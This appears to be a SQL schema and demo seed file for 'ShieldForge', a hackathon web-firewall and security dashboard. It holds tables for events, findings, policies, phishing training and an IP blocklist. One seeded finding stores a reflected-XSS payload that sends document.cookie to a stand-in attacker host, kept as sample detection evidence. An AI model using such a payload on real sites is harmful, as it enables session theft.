-- ShieldForge core schema (01_ARCHITECTURE.md §5).
-- Canonical owner: Part 3 (dashboard/supabase). This copy is the migration applied
-- for the shared hackathon project so Part 4 can run standalone.
-- RLS is on with no public policies: clients use the service role server-side.

create table if not exists tenants (
  id uuid primary key default gen_random_uuid(),
  name text not null,
  created_at timestamptz default now()
);

create table if not exists origins (
  id uuid primary key default gen_random_uuid(),
  tenant_id uuid references tenants(id),
  origin_url text not null,
  proxy_path text not null,
  status text default 'active',
  created_at timestamptz default now()
);

create table if not exists events (
  id uuid primary key default gen_random_uuid(),
  origin_id uuid references origins(id),
  ts timestamptz default now(),
  method text,
  path text,
  ip text,
  user_agent text,
  status_code int,
  rule_hit text,
  features jsonb,
  ml_attack_class text,
  ml_confidence float,
  ml_risk_score int
);

create table if not exists findings (
  id uuid primary key default gen_random_uuid(),
  origin_id uuid references origins(id),
  event_id uuid references events(id),
  severity text,
  category text,
  title text,
  evidence jsonb,
  ai_summary text,
  status text default 'open',
  created_at timestamptz default now()
);

create table if not exists incidents (
  id uuid primary key default gen_random_uuid(),
  finding_id uuid references findings(id),
  action_taken text,
  confidence float,
  resolved boolean default false,
  created_at timestamptz default now()
);

create table if not exists policies (
  id uuid primary key default gen_random_uuid(),
  origin_id uuid references origins(id),
  auto_block_threshold float default 0.9,
  alert_threshold float default 0.6,
  mode text default 'shadow'
);

create table if not exists audit_log (
  id uuid primary key default gen_random_uuid(),
  actor text,
  action text,
  target jsonb,
  ts timestamptz default now()
);

create table if not exists training_users (
  id uuid primary key default gen_random_uuid(),
  name text,
  risk_score int default 0
);

create table if not exists training_events (
  id uuid primary key default gen_random_uuid(),
  user_id uuid references training_users(id),
  event_type text,
  ts timestamptz default now()
);

create index if not exists origins_tenant_id_idx on origins(tenant_id);
create index if not exists events_origin_id_idx on events(origin_id);
create index if not exists findings_origin_id_idx on findings(origin_id);
create index if not exists findings_event_id_idx on findings(event_id);
create index if not exists findings_ai_summary_null_idx on findings(created_at) where ai_summary is null;
create index if not exists incidents_finding_id_idx on incidents(finding_id);
create index if not exists policies_origin_id_idx on policies(origin_id);
create index if not exists training_events_user_id_idx on training_events(user_id);
create index if not exists training_events_clicked_idx on training_events(user_id, ts desc) where event_type = 'phishing_clicked';

alter table tenants enable row level security;
alter table origins enable row level security;
alter table events enable row level security;
alter table findings enable row level security;
alter table incidents enable row level security;
alter table policies enable row level security;
alter table audit_log enable row level security;
alter table training_users enable row level security;
alter table training_events enable row level security;

do $$
declare t text;
begin
  if exists (select 1 from pg_publication where pubname = 'supabase_realtime') then
    foreach t in array array['events', 'findings', 'incidents'] loop
      begin
        execute format('alter publication supabase_realtime add table %I', t);
      exception when duplicate_object then null;
      end;
    end loop;
  end if;
end $$;
-- ip_blocks table for persistent IP blocklist
-- Run this in Supabase SQL Editor

CREATE TABLE IF NOT EXISTS ip_blocks (
  ip TEXT PRIMARY KEY,
  expires_at TIMESTAMPTZ NOT NULL,
  created_at TIMESTAMPTZ NOT NULL DEFAULT NOW()
);

CREATE INDEX IF NOT EXISTS idx_ip_blocks_expires_at ON ip_blocks(expires_at);

-- RLS is enabled by default on new tables
ALTER TABLE ip_blocks ENABLE ROW LEVEL SECURITY;
-- Demo data for the Part 4 acceptance tests. Safe to re-run.

insert into tenants (id, name)
values ('11111111-1111-4111-8111-111111111111', 'ShieldForge Demo')
on conflict (id) do nothing;

insert into origins (id, tenant_id, origin_url, proxy_path)
values (
  '55555555-5555-4555-8555-555555555555',
  '11111111-1111-4111-8111-111111111111',
  'https://aisummit.ieeebangalore.org',
  '/t/aisummit'
), (
  '77777777-7777-4777-8777-777777777777',
  '11111111-1111-4111-8111-111111111111',
  'https://fakizon.vercel.app',
  '/t/fakizon'
), (
  '22222222-2222-4222-8222-222222222222',
  '11111111-1111-4111-8111-111111111111',
  'https://victim-shop.vercel.app',
  '/t/victim-shop'
)
on conflict (id) do nothing;

insert into policies (id, origin_id, auto_block_threshold, alert_threshold, mode)
values
  ('99999999-9999-4999-8999-999999999991', '55555555-5555-4555-8555-555555555555', 0.9, 0.6, 'enforce'),
  ('99999999-9999-4999-8999-999999999992', '77777777-7777-4777-8777-777777777777', 0.9, 0.6, 'enforce'),
  ('99999999-9999-4999-8999-999999999993', '22222222-2222-4222-8222-222222222222', 0.9, 0.6, 'enforce')
on conflict (id) do nothing;

insert into findings (id, origin_id, severity, category, title, evidence)
values (
  '33333333-3333-4333-8333-333333333333',
  '22222222-2222-4222-8222-222222222222',
  'high',
  'xss',
  'Reflected script in comment field',
  '{"payload":"<script>fetch(''https://attacker.vercel.app/c?''+document.cookie)</script>","path":"/comment"}'
)
on conflict (id) do nothing;

insert into training_users (id, name)
values
  ('44444444-4444-4444-8444-444444444444', 'Asha'),
  ('55555555-5555-4555-8555-555555555555', 'Ravi'),
  ('66666666-6666-4666-8666-666666666666', 'Meera')
on conflict (id) do nothing;
